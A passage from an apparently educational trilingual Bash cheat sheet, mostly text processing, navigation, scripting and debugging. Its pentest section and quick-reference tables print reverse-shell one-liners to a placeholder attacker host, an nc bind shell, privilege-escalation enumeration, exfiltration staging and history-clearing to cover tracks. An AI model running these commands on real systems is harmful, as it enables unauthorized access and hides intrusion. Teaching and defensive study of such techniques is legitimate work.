    echo "Unknown command"
fi

# ── TEST OPERATORS (inside [ ] or [[ ]]) ──────────────────────────
# String comparison
[ "$a" = "$b" ]      # equal
[ "$a" != "$b" ]     # not equal
[ -z "$a" ]          # string is empty
[ -n "$a" ]          # string is NOT empty

# Numeric comparison
[ "$a" -eq "$b" ]    # equal
[ "$a" -ne "$b" ]    # not equal
[ "$a" -lt "$b" ]    # less than
[ "$a" -le "$b" ]    # less than or equal
[ "$a" -gt "$b" ]    # greater than
[ "$a" -ge "$b" ]    # greater than or equal

# File tests
[ -f "$file" ]       # is a regular file
[ -d "$dir" ]        # is a directory
[ -e "$path" ]       # exists (file or dir)
[ -r "$file" ]       # is readable
[ -w "$file" ]       # is writable
[ -x "$file" ]       # is executable
[ -s "$file" ]       # exists and is not empty
[ -L "$file" ]       # is a symbolic link

# ── [[ ]] MODERN TEST (bash-specific, supports regex & globs) ─────
[[ "$str" == *.txt ]]            # pattern matching
[[ "$str" =~ ^[0-9]+$ ]]         # regex matching
[[ "$a" -eq 5 && "$b" -eq 10 ]]  # AND condition
[[ "$a" -eq 5 || "$b" -eq 10 ]]  # OR condition

# ── CASE STATEMENT ─────────────────────────────────────────────────
case "$1" in
    start)
        echo "Starting service"
        ;;
    stop)
        echo "Stopping service"
        ;;
    restart|reload)
        echo "Restarting service"
        ;;
    *)
        echo "Usage: $0 {start|stop|restart}"
        exit 1
        ;;
esac

# ── PRACTICAL PENTEST/SYSADMIN EXAMPLES ───────────────────────────

# Ping sweep a subnet
for i in {1..254}; do
    ping -c 1 -W 1 "192.168.1.$i" &>/dev/null && echo "192.168.1.$i is alive" &
done
wait

# Check multiple ports on a host
for port in 21 22 23 25 80 443 3389; do
    timeout 1 bash -c "echo > /dev/tcp/target.com/$port" 2>/dev/null && \
        echo "Port $port is OPEN"
done

# Brute-force-style loop over a wordlist
while read -r password; do
    echo "Trying: $password"
    # attempt login here
done < passwords.txt
```

| Construct | 🇮🇩 Penggunaan | 🇬🇧 Use Case | 🇯🇵 用途 |
|-----------|---------------|-------------|---------|
| `for i in {1..N}` | Iterasi rentang angka | Iterate number range | 数値範囲の繰り返し |
| `while read line` | Baca file baris per baris | Read file line-by-line | ファイルを行ごとに読む |
| `[[ =~ regex ]]` | Pencocokan regex | Regex matching | 正規表現マッチング |
| `case ... esac` | Multi-branch logika | Multi-branch logic | 多分岐ロジック |
| `/dev/tcp/host/port` | Cek port tanpa nc/nmap | Port check without nc/nmap | nc/nmapなしのポート確認 |

---

## 10. 📝 Text Processing — One-Liners

### 🇮🇩 Bahasa Indonesia
Trio **grep, sed, awk** adalah senjata utama untuk memproses teks di Bash. Dikombinasikan dengan `cut`, `sort`, `uniq`, dan `tr`, Anda bisa mengubah, memfilter, dan menganalisis data teks tanpa perlu bahasa pemrograman lain.

### 🇬🇧 English
The **grep, sed, awk** trio are the primary weapons for text processing in Bash. Combined with `cut`, `sort`, `uniq`, and `tr`, you can transform, filter, and analyze text data without needing another programming language.

### 🇯🇵 日本語
**grep、sed、awk**のトリオはBashにおけるテキスト処理の主要な武器です。`cut`、`sort`、`uniq`、`tr`と組み合わせることで、他のプログラミング言語を必要とせずにテキストデータの変換、フィルタリング、分析ができます。

```bash
# ── GREP — search & filter ───────────────────────────────────────
grep "pattern" file.txt              # basic search
grep -i "pattern" file.txt           # case-insensitive
grep -r "pattern" /path/             # recursive search in directory
grep -v "pattern" file.txt           # invert match (exclude lines)
grep -c "pattern" file.txt           # count matching lines
grep -n "pattern" file.txt           # show line numbers
grep -l "pattern" *.txt              # show only filenames with matches
grep -A 3 "pattern" file.txt         # show 3 lines AFTER match
grep -B 3 "pattern" file.txt         # show 3 lines BEFORE match
grep -E "pattern1|pattern2" file.txt # extended regex (OR)
grep -o "pattern" file.txt           # show only matched part
grep -P '\d{3}-\d{4}' file.txt       # Perl-compatible regex (PCRE)

# Find IPs in a log file
grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' access.log | sort -u

# Find email addresses
grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' file.txt

# ── SED — stream editor (find & replace) ─────────────────────────
sed 's/old/new/' file.txt            # replace FIRST occurrence per line
sed 's/old/new/g' file.txt           # replace ALL occurrences
sed -i 's/old/new/g' file.txt        # edit file IN PLACE
sed -i.bak 's/old/new/g' file.txt    # in-place edit + create backup
sed -n '5,10p' file.txt              # print only lines 5-10
sed '2d' file.txt                    # delete line 2
sed '/pattern/d' file.txt            # delete lines matching pattern
sed -n '/start/,/end/p' file.txt     # print between two patterns
sed 's/^/PREFIX_/' file.txt          # add prefix to each line
sed 's/$/_SUFFIX/' file.txt          # add suffix to each line

# ── AWK — field processing & reports ──────────────────────────────
awk '{print $1}' file.txt              # print first column/field
awk '{print $1, $3}' file.txt          # print fields 1 and 3
awk -F: '{print $1}' /etc/passwd       # custom field delimiter (:)
awk '{print NR, $0}' file.txt          # add line numbers
awk 'NR==5' file.txt                   # print only line 5
awk 'length > 80' file.txt             # print lines longer than 80 chars
awk '{sum+=$1} END {print sum}' nums.txt  # sum a column
awk '{print $NF}' file.txt             # print LAST field of each line
awk '/error/ {print}' logfile.txt      # print lines matching pattern

# Extract usernames from /etc/passwd
awk -F: '{print $1}' /etc/passwd

# Print process using most memory
ps aux | awk '{print $4, $11}' | sort -rn | head

# ── CUT — extract columns ─────────────────────────────────────────
cut -d: -f1 /etc/passwd               # field 1, delimiter :
cut -d, -f2,4 data.csv                # fields 2 and 4 from CSV
cut -c1-10 file.txt                   # characters 1 to 10

# ── SORT & UNIQ ────────────────────────────────────────────────────
sort file.txt                          # alphabetical sort
sort -n file.txt                       # numeric sort
sort -r file.txt                       # reverse sort
sort -u file.txt                       # sort + remove duplicates
sort -k2 file.txt                      # sort by 2nd column
sort -t: -k3 -n /etc/passwd            # sort by UID (3rd field, : delim)

uniq file.txt                          # remove ADJACENT duplicates (sort first!)
uniq -c file.txt                       # count occurrences
sort file.txt | uniq -c | sort -rn     # frequency count, most common first

# ── TR — translate/delete characters ──────────────────────────────
echo "hello" | tr 'a-z' 'A-Z'          # uppercase
echo "hello world" | tr -d ' '          # delete spaces
echo "hello   world" | tr -s ' '        # squeeze repeated spaces
cat file.txt | tr '\n' ','              # newlines to commas

# ── WC — word/line/char count ─────────────────────────────────────
wc -l file.txt                          # count lines
wc -w file.txt                          # count words
wc -c file.txt                          # count bytes
cat file.txt | wc -l                    # count piped lines

# ── COMBINING TOOLS — POWERFUL ONE-LINERS ──────────────────────────

# Top 10 most frequent IPs in access log
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -10

# Count unique visitors
awk '{print $1}' access.log | sort -u | wc -l

# Find largest files in directory
du -ah . | sort -rh | head -10

# Extract all unique URLs from a file
grep -oE 'https?://[^"]+' file.html | sort -u

# Parse nmap output for open ports
grep "open" nmap_scan.txt | awk '{print $1}'

# Count HTTP status codes in log
awk '{print $9}' access.log | sort | uniq -c | sort -rn
```

| Tool | 🇮🇩 Fungsi | 🇬🇧 Function | 🇯🇵 機能 |
|------|-----------|-------------|---------|
| `grep` | Cari pola teks | Search text patterns | テキストパターン検索 |
| `sed` | Cari & ganti (stream editor) | Find & replace (stream editor) | 検索と置換 |
| `awk` | Pemrosesan kolom/field | Field/column processing | 列/フィールド処理 |
| `cut` | Ekstrak kolom | Extract columns | 列を抽出 |
| `sort \| uniq -c` | Hitung frekuensi | Frequency count | 頻度カウント |
| `tr` | Translasi karakter | Character translation | 文字変換 |

---

## 11. 🧭 Navigation Tricks — Directory Movement

### 🇮🇩 Bahasa Indonesia
Navigasi cepat di terminal sangat meningkatkan produktivitas, terutama saat berpindah-pindah antara banyak direktori proyek atau hasil pentest.

### 🇬🇧 English
Fast terminal navigation significantly boosts productivity, especially when jumping between many project directories or pentest result folders.

### 🇯🇵 日本語
ターミナルでの高速なナビゲーションは、特に多くのプロジェクトディレクトリやペンテスト結果フォルダ間を移動する際に生産性を大幅に向上させます。

```bash
# ── BASIC NAVIGATION SHORTCUTS ───────────────────────────────────
cd -            # go to PREVIOUS directory (toggle back/forth)
cd              # go to home directory (no argument)
cd ~            # also home directory
cd ~user        # another user's home directory
cd ..           # up one level
cd ../..        # up two levels
cd /            # root directory

# ── PUSHD / POPD / DIRS — directory stack ────────────────────────
pushd /var/www       # cd there AND remember current dir on stack
pushd /etc           # cd there, stack now has 2 entries
dirs -v               # view the stack with indices
popd                  # go back to previous dir, remove from stack
cd ~5                 # (with dirs) jump to stack entry 5, if configured

# ── CDPATH — search multiple base directories ────────────────────
export CDPATH=".:~:~/projects:/var/www"
cd myproject           # finds it in any CDPATH directory automatically

# ── AUTOCD (bash 4+) ───────────────────────────────────────────────
shopt -s autocd
/var/log                # typing a path alone cd's into it (no `cd` needed)

# ── FUZZY NAVIGATION WITH fzf (if installed) ──────────────────────
cd **<Tab>              # fuzzy path completion (requires fzf + bash-completion)
fzf                       # interactive fuzzy file finder
cd "$(find . -type d | fzf)"   # fuzzy cd into any subdirectory

# ── QUICK FILE/DIR LISTING ────────────────────────────────────────
ls -la                    # long listing, show hidden files
ls -lh                    # human-readable sizes
ls -lt                    # sort by modification time (newest first)
ls -lS                    # sort by size (largest first)
ls -R                     # recursive listing
tree                      # tree-style directory view (if installed)
tree -L 2                 # limit depth to 2 levels

# ── BOOKMARKING DIRECTORIES (function-based) ──────────────────────
# Add to ~/.bashrc:
export MARKPATH=$HOME/.marks
function jump {
    cd -P "$MARKPATH/$1" 2>/dev/null || echo "No such mark: $1"
}
function mark {
    mkdir -p "$MARKPATH"; ln -s "$(pwd)" "$MARKPATH/$1"
}
function unmark {
    rm -i "$MARKPATH/$1"
}
function marks {
    ls -l "$MARKPATH" | sed 's/  / /g' | cut -d' ' -f9- | sed 's/ -/\t-/g'
}
# Usage:
mark work               # bookmark current dir as "work"
jump work                # jump back to it from anywhere
marks                    # list all bookmarks

# ── WILDCARDS FOR QUICK ACCESS ────────────────────────────────────
cd /var/log/ng*           # expands to /var/log/nginx (if unambiguous)
ls /etc/*.conf            # all .conf files directly under /etc

# ── LOCATE & FIND — search the filesystem ─────────────────────────
locate filename            # fast search using prebuilt database
updatedb                   # refresh locate's database (run as root)
find / -name "*.conf" 2>/dev/null          # search by name
find / -type f -mtime -1 2>/dev/null        # files modified in last 1 day
find / -perm -4000 2>/dev/null              # find SUID binaries (pentest!)
find / -writable -type d 2>/dev/null        # find world-writable dirs (privesc!)
```

| Trick | 🇮🇩 Fungsi | 🇬🇧 Function | 🇯🇵 機能 |
|-------|-----------|-------------|---------|
| `cd -` | Kembali ke direktori sebelumnya | Return to previous directory | 前のディレクトリに戻る |
| `pushd`/`popd` | Tumpukan direktori | Directory stack | ディレクトリスタック |
| `shopt -s autocd` | cd otomatis tanpa ketik `cd` | Auto-cd without typing `cd` | `cd`なしで自動移動 |
| `tree -L 2` | Tampilan pohon terbatas | Limited-depth tree view | 階層制限のツリー表示 |
| `find / -perm -4000` | Cari SUID binary (privesc) | Find SUID binaries (privesc) | SUIDバイナリ検索（権限昇格） |

---

## 12. 📜 Scripting Best Practices

### 🇮🇩 Bahasa Indonesia
Menulis script Bash yang baik berarti memikirkan **keterbacaan, keamanan, dan penanganan error**. Berikut praktik terbaik yang sebaiknya selalu diterapkan.

### 🇬🇧 English
Writing good Bash scripts means thinking about **readability, safety, and error handling**. Below are best practices that should always be applied.

### 🇯🇵 日本語
良いBashスクリプトを書くということは、**可読性、安全性、エラーハンドリング**について考えることを意味します。以下は常に適用すべきベストプラクティスです。

```bash
#!/usr/bin/env bash
# ↑ Always start with a shebang — portable across systems

# ── STRICT MODE (highly recommended) ─────────────────────────────
set -e            # exit immediately if any command fails
set -u            # treat unset variables as an error
set -o pipefail   # fail if ANY command in a pipeline fails (not just last)
set -x            # print each command before executing (debug mode)

# Combined strict mode (common pattern):
set -euo pipefail

# ── ALWAYS QUOTE VARIABLES ────────────────────────────────────────
# BAD:  rm -rf $dir           (breaks on spaces, globs, empty var!)
# GOOD: rm -rf "$dir"

filename="my file.txt"
# BAD:
for f in $(ls); do echo $f; done      # breaks with spaces in filenames
# GOOD:
for f in *; do echo "$f"; done         # safe globbing

# ── CHECK COMMAND SUCCESS EXPLICITLY ──────────────────────────────
if ! command -v nmap &> /dev/null; then
    echo "Error: nmap is not installed" >&2
    exit 1
fi

# ── USE FUNCTIONS FOR REUSABLE LOGIC ──────────────────────────────
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*"
}
log "Starting scan..."

# ── VALIDATE ARGUMENTS ─────────────────────────────────────────────
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <target> <port>" >&2
    exit 1
fi
target="$1"
port="$2"

# ── TRAP — cleanup on exit/interrupt ──────────────────────────────
cleanup() {
    echo "Cleaning up temp files..."
    rm -f /tmp/scan_$$.tmp
}
trap cleanup EXIT
trap 'echo "Interrupted!"; exit 130' INT

# ── USE LOCAL VARIABLES IN FUNCTIONS ──────────────────────────────
process() {
    local input="$1"      # local = doesn't leak into global scope
    local result
    result=$(echo "$input" | tr 'a-z' 'A-Z')
    echo "$result"
}

# ── SHELLCHECK — lint your scripts ────────────────────────────────
# Install: apt install shellcheck
$ shellcheck myscript.sh
# Catches quoting issues, unused vars, common pitfalls

# ── USE [[ ]] OVER [ ] WHEN POSSIBLE ───────────────────────────────
# [[ ]] is bash-specific, safer, supports && || directly, no word-splitting issues
if [[ -f "$file" && -r "$file" ]]; then
    echo "File exists and is readable"
fi

# ── AVOID PARSING ls — use globs or find instead ───────────────────
# BAD:
for f in $(ls *.txt); do ...; done
# GOOD:
for f in *.txt; do ...; done

# ── PREFER $(...) OVER BACKTICKS ───────────────────────────────────
# BAD:  result=`command`     (can't nest easily, harder to read)
# GOOD: result=$(command)    (nestable, modern)

# ── SCRIPT TEMPLATE ─────────────────────────────────────────────────
cat << 'TEMPLATE'
#!/usr/bin/env bash
set -euo pipefail

usage() {
    echo "Usage: $0 [-v] <target>"
    exit 1
}

main() {
    local target="${1:?Error: target required}"
    log "Starting on $target"
    # main logic here
}

log() {
    echo "[$(date '+%T')] $*" >&2
}

main "$@"
TEMPLATE
```

| Practice | 🇮🇩 Manfaat | 🇬🇧 Benefit | 🇯🇵 利点 |
|----------|-----------|-----------|---------|
| `set -euo pipefail` | Gagal cepat & jelas | Fail fast & loud | 早期かつ明確に失敗 |
| Quote `"$var"` | Cegah word-splitting | Prevent word-splitting | ワード分割を防止 |
| `[[ ]]` over `[ ]` | Lebih aman & fitur lebih banyak | Safer, more features | より安全で機能豊富 |
| `trap cleanup EXIT` | Bersih-bersih otomatis | Automatic cleanup | 自動クリーンアップ |
| `shellcheck` | Temukan bug sebelum jalan | Catch bugs before running | 実行前にバグ検出 |

---

## 13. 🐛 Debugging — Finding Script Issues

### 🇮🇩 Bahasa Indonesia
Debugging script Bash bisa menantang karena error sering bersifat silent. Bash menyediakan beberapa mekanisme bawaan untuk membantu melacak masalah.

### 🇬🇧 English
Debugging Bash scripts can be challenging since errors are often silent. Bash provides several built-in mechanisms to help track down problems.

### 🇯🇵 日本語
Bashスクリプトのデバッグは、エラーがしばしばサイレントであるため困難な場合があります。Bashには問題を追跡するための組み込みメカニズムがいくつか用意されています。

```bash
# ── ENABLE DEBUG MODE ────────────────────────────────────────────
bash -x script.sh                  # run with trace mode from CLI
set -x                              # turn ON trace mode inside script
set +x                              # turn OFF trace mode

# Trace only a specific section:
set -x
risky_function
set +x

# ── VERBOSE MODE ──────────────────────────────────────────────────
bash -v script.sh                   # print each line as read (before execution)

# ── COMBINE MODES ─────────────────────────────────────────────────
bash -xv script.sh                  # both trace AND verbose

# ── CUSTOM PS4 PROMPT (shows line numbers in trace) ───────────────
export PS4='+ ${BASH_SOURCE}:${LINENO}: '
bash -x script.sh
# Output now shows: + script.sh:12: echo "hello"

# ── SYNTAX CHECK WITHOUT RUNNING ──────────────────────────────────
bash -n script.sh                   # check syntax only, don't execute

# ── DEBUG SPECIFIC VARIABLES ──────────────────────────────────────
echo "DEBUG: var=$var" >&2          # print to stderr for visibility
declare -p var                       # show variable type and value clearly

# ── TRAP DEBUG (run before every command) ─────────────────────────
trap 'echo "Executing: $BASH_COMMAND"' DEBUG

# ── CHECK EXIT CODES ──────────────────────────────────────────────
command
echo "Exit code: $?"

# ── ERR TRAP — catch any failing command ──────────────────────────
trap 'echo "Error on line $LINENO"' ERR
set -e

# ── SHELLCHECK — static analysis (best debugging tool) ─────────────
shellcheck script.sh
shellcheck -x script.sh             # follow sourced files too

# ── COMMON BASH PITFALLS TO WATCH FOR ─────────────────────────────
# 1. Unquoted variables → word splitting / glob expansion
# 2. [ $var == "x" ] when $var is empty → syntax error
#    FIX: [ "$var" == "x" ]
# 3. Using = instead of -eq for numbers
# 4. Forgetting `local` in functions → variable leaks to global scope
# 5. Using `cmd1 | cmd2` and expecting cmd1's exit code to matter
#    FIX: set -o pipefail
# 6. Mixing tabs/spaces in heredocs with indentation
# 7. Not quoting "$@"  →  use "$@" not $@ to preserve argument boundaries
```

| Method | 🇮🇩 Fungsi | 🇬🇧 Function | 🇯🇵 機能 |
|--------|-----------|-------------|---------|
| `bash -x script.sh` | Mode trace (lihat tiap perintah) | Trace mode (see each command) | トレースモード |
| `bash -n script.sh` | Cek syntax tanpa eksekusi | Syntax check only | 構文チェックのみ |
| `set -x` / `set +x` | Aktif/nonaktif trace di tengah script | Toggle trace mid-script | スクリプト内でトレース切替 |
| `trap ... ERR` | Tangkap baris yang gagal | Catch failing line | 失敗した行を捕捉 |
| `shellcheck` | Analisis statis & lint | Static analysis & linting | 静的解析とリント |

---

## 14. 🔐 Security Note — Bash for Pentest & CTF

### 🇮🇩 Bahasa Indonesia
Bash sering menjadi shell pertama yang didapat penyerang (reverse shell), dan juga merupakan tool utama untuk enumerasi, eksploitasi, dan privilege escalation, terutama saat tool lain tidak tersedia ("living off the land").

### 🇬🇧 English
Bash is often the first shell an attacker obtains (reverse shell), and is also a primary tool for enumeration, exploitation, and privilege escalation, especially when other tools aren't available ("living off the land").

### 🇯🇵 日本語
Bashは攻撃者が最初に取得するシェル（リバースシェル）であることが多く、特に他のツールが利用できない場合（「Living off the land」）、列挙、エクスプロイト、権限昇格の主要なツールでもあります。

```bash
# ── REVERSE SHELLS (Bash) ────────────────────────────────────────
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'
0<&196;exec 196<>/dev/tcp/attacker_ip/4444; sh <&196 >&196 2>&196

# Listener on attacker side:
nc -lvnp 4444

# ── BIND SHELL ─────────────────────────────────────────────────────
bash -i >& /dev/tcp/0.0.0.0/4444 0>&1   # not standard bind, use socat/nc instead
nc -lvnp 4444 -e /bin/bash               # if nc supports -e

# ── TTY UPGRADE (after getting a reverse shell) ───────────────────
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Then Ctrl+Z, then on attacker machine:
stty raw -echo; fg
# Then in the shell:
reset

# ── LINUX PRIVILEGE ESCALATION ENUMERATION ─────────────────────────

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Find world-writable files/directories
find / -writable -type f 2>/dev/null | grep -v "^/proc"
find / -perm -o+w -type d 2>/dev/null

# Check sudo privileges
sudo -l

# Check current user, groups, and privileges
id; whoami; groups

# Search for passwords in files
grep -r "password" /etc/ 2>/dev/null
grep -ri "password" /var/www/ 2>/dev/null

# Check cron jobs (often privesc vector)
cat /etc/crontab
ls -la /etc/cron.d/
crontab -l

# Check for writable PATH binaries (PATH hijacking)
echo $PATH
find / -writable -path "*/bin/*" 2>/dev/null

# Check kernel version for known exploits
uname -a
cat /etc/os-release

# Check listening ports / services
ss -tulnp
netstat -tulnp

# Check NFS exports (often misconfigured = root access)
cat /etc/exports

# ── ENVIRONMENT-AWARE ONE-LINERS (no tools needed) ─────────────────

# Check connectivity without ping/nc (pure bash)
timeout 1 bash -c "echo > /dev/tcp/target/80" && echo "Port 80 open"

# Download file without wget/curl (pure bash, if /dev/tcp available)
exec 3<>/dev/tcp/target.com/80
echo -e "GET /file.txt HTTP/1.0\r\nHost: target.com\r\n\r\n" >&3
cat <&3

# Simple HTTP server for exfil staging
python3 -m http.server 8000

# Base64 encode/decode for exfiltration
echo "data" | base64 -w0
echo "ZGF0YQ==" | base64 -d

# ── HISTORY HYGIENE (covering tracks — KNOW FOR DEFENSE TOO) ───────
unset HISTFILE                      # disable history for this session
export HISTSIZE=0                    # stop recording history
history -c                           # clear current session's history
# NOTE: Use only in authorized testing — covering tracks on systems
# you don't own/have permission for is illegal.
```

### 📊 Bash Pentest Cheat Table

| Use Case | Command | 🇮🇩 Catatan | 🇬🇧 Notes |
|----------|---------|-----------|---------|
| Reverse shell | `bash -i >& /dev/tcp/IP/PORT 0>&1` | Klasik, sangat umum | Classic, very common |
| SUID enum | `find / -perm -4000 2>/dev/null` | Cari binary privesc | Find privesc binaries |
| Port check tanpa nc | `</dev/tcp/host/port` | Murni bash | Pure bash |
| TTY upgrade | `python3 -c 'import pty;pty.spawn("/bin/bash")'` | Shell interaktif penuh | Full interactive shell |
| Cron enum | `cat /etc/crontab` | Vektor privesc umum | Common privesc vector |
| Sudo check | `sudo -l` | Cek hak sudo | Check sudo rights |

---

## 15. 🔄 Practical Workflow — Real-World Examples

```bash
# ── SCENARIO 1: Quick log analysis during incident response ────────

# Find all failed SSH login attempts
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn

# Find IPs with more than 10 failed attempts (possible brute force)
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | \
    awk '$1 > 10 {print $2, "attempts:", $1}'

# Timeline of events for a specific IP
grep "203.0.113.5" /var/log/auth.log | awk '{print $1, $2, $3}'

# ── SCENARIO 2: Bulk host reachability + port check ──────────────────

#!/usr/bin/env bash
set -euo pipefail

hosts_file="hosts.txt"
port=22

while read -r host; do
    if timeout 1 bash -c "echo > /dev/tcp/$host/$port" 2>/dev/null; then
        echo "[OPEN] $host:$port"
    else
        echo "[CLOSED] $host:$port"
    fi
done < "$hosts_file"

# ── SCENARIO 3: Organize downloaded files by extension ───────────────

#!/usr/bin/env bash
set -euo pipefail

for file in *; do
    [ -f "$file" ] || continue
    ext="${file##*.}"
    mkdir -p "$ext"
    mv "$file" "$ext/"
done

# ── SCENARIO 4: Find recently modified config files (forensics) ──────

find / -name "*.conf" -mtime -1 2>/dev/null
find / -newer /tmp/reference_file -type f 2>/dev/null

# ── SCENARIO 5: Bulk rename with sed ──────────────────────────────────

for f in IMG_*.jpg; do
    new_name=$(echo "$f" | sed 's/IMG_/photo_/')
    mv "$f" "$new_name"
done

# ── SCENARIO 6: Watch a log file live and alert on pattern ───────────

tail -f /var/log/auth.log | grep --line-buffered "Failed password" | \
while read -r line; do
    echo "ALERT: $line" | tee -a alerts.log
done

# ── SCENARIO 7: Quick system health snapshot ──────────────────────────

#!/usr/bin/env bash
echo "=== System Health Snapshot ($(date)) ==="
echo "--- Uptime ---"; uptime
echo "--- Disk Usage ---"; df -h
echo "--- Memory ---"; free -h
echo "--- Top 5 CPU processes ---"; ps aux --sort=-%cpu | head -6
echo "--- Top 5 Memory processes ---"; ps aux --sort=-%mem | head -6
echo "--- Listening ports ---"; ss -tulnp
```

---

## 🧠 Quick Reference Cheatsheet

```bash
# ── KEYBOARD SHORTCUTS ────────────────────────────────────────────
Ctrl+A / Ctrl+E      → start / end of line
Ctrl+U / Ctrl+K      → delete to start / end of line
Ctrl+W                → delete one word back
Ctrl+R                → reverse search history
Ctrl+L                → clear screen
Ctrl+C / Ctrl+Z       → kill / suspend process
Tab / Tab Tab         → autocomplete / show options

# ── HISTORY ────────────────────────────────────────────────────────
!!          → repeat last command
!$          → last argument of previous command
sudo !!     → rerun last command with sudo
Ctrl+R      → search history interactively

# ── NAVIGATION ────────────────────────────────────────────────────
cd -         → previous directory
pushd/popd   → directory stack
mkcd() { mkdir -p "$1" && cd "$1"; }

# ── GLOBBING ───────────────────────────────────────────────────────
*            → any characters
?            → single character
{1..10}      → number range
{a,b,c}      → brace list

# ── REDIRECTION ───────────────────────────────────────────────────
>            → overwrite stdout
>>           → append stdout
2>&1         → merge stderr into stdout
&>           → redirect both stdout+stderr
| tee file   → show + save output

# ── VARIABLE TRICKS ───────────────────────────────────────────────
${var:-default}    → default if unset
${var##*/}         → basename
${var%.*}          → strip extension
${var^^} / ${var,,} → uppercase / lowercase
$(command)         → command substitution

# ── JOB CONTROL ───────────────────────────────────────────────────
cmd &        → background
jobs         → list jobs
fg / bg      → foreground / background
nohup cmd &  → survive logout
kill -9 PID  → force kill

# ── TEXT PROCESSING ───────────────────────────────────────────────
grep -oE 'regex' file       → extract matches
sed 's/old/new/g' file      → find & replace
awk '{print $1}' file       → print column
sort | uniq -c | sort -rn   → frequency count

# ── SCRIPTING ESSENTIALS ──────────────────────────────────────────
#!/usr/bin/env bash
set -euo pipefail
trap cleanup EXIT
[[ -f "$file" ]] && echo "exists"

# ── DEBUGGING ──────────────────────────────────────────────────────
bash -x script.sh    → trace mode
bash -n script.sh    → syntax check only
shellcheck script.sh → static analysis

# ── PENTEST QUICK HITS ────────────────────────────────────────────
bash -i >& /dev/tcp/IP/PORT 0>&1        → reverse shell
find / -perm -4000 2>/dev/null           → SUID enum
</dev/tcp/host/port                       → port check (no nc)
python3 -c 'import pty;pty.spawn("/bin/bash")'  → TTY upgrade
```

---

## 📊 Complete Shortcut Reference Table

| Category | Shortcut/Command | 🇮🇩 Fungsi | 🇬🇧 Function | 🇯🇵 機能 |
|----------|------------------|-----------|-------------|---------|
| Navigation | `Ctrl+A` / `Ctrl+E` | Awal/akhir baris | Start/end of line | 行頭/行末 |
| Navigation | `cd -` | Direktori sebelumnya | Previous directory | 前のディレクトリ |
| History | `Ctrl+R` | Cari riwayat | Search history | 履歴検索 |
| History | `!!` | Ulangi terakhir | Repeat last | 最後を再実行 |
| Editing | `Ctrl+U` / `Ctrl+K` | Hapus ke awal/akhir | Delete to start/end | 行頭/行末まで削除 |
| Editing | `Ctrl+W` | Hapus satu kata | Delete one word | 1単語削除 |
| Process | `Ctrl+C` / `Ctrl+Z` | Kill / Suspend | Kill / Suspend | 強制終了/一時停止 |
| Process | `jobs` / `fg` / `bg` | Kontrol job | Job control | ジョブ制御 |
| Completion | `Tab` | Auto-lengkapi | Auto-complete | 自動補完 |
| Text | `grep` / `sed` / `awk` | Proses teks | Text processing | テキスト処理 |
| Scripting | `set -euo pipefail` | Mode aman | Safe mode | 安全モード |

---

> 📚 **References:**
> - [GNU Bash Manual](https://www.gnu.org/software/bash/manual/bash.html)
> - [Bash Reference — Readline Shortcuts](https://www.gnu.org/software/bash/manual/html_node/Bindable-Readline-Commands.html)
> - [ShellCheck — Bash Linter](https://www.shellcheck.net)
> - [Explainshell — Command Explainer](https://explainshell.com)
> - [PayloadsAllTheThings — Linux/Bash](https://github.com/swisskyrepo/PayloadsAllTheThings)
> - [GTFOBins — Unix Binaries for Privesc](https://gtfobins.github.io)

> 🔖 **Repository:** [LearnCybersecurity](https://github.com/Kodokthegr3at/LearnCybersecurity)  
> 💬 **Feedback & Contributions welcome!** Open an issue or PR if you spot any errors.
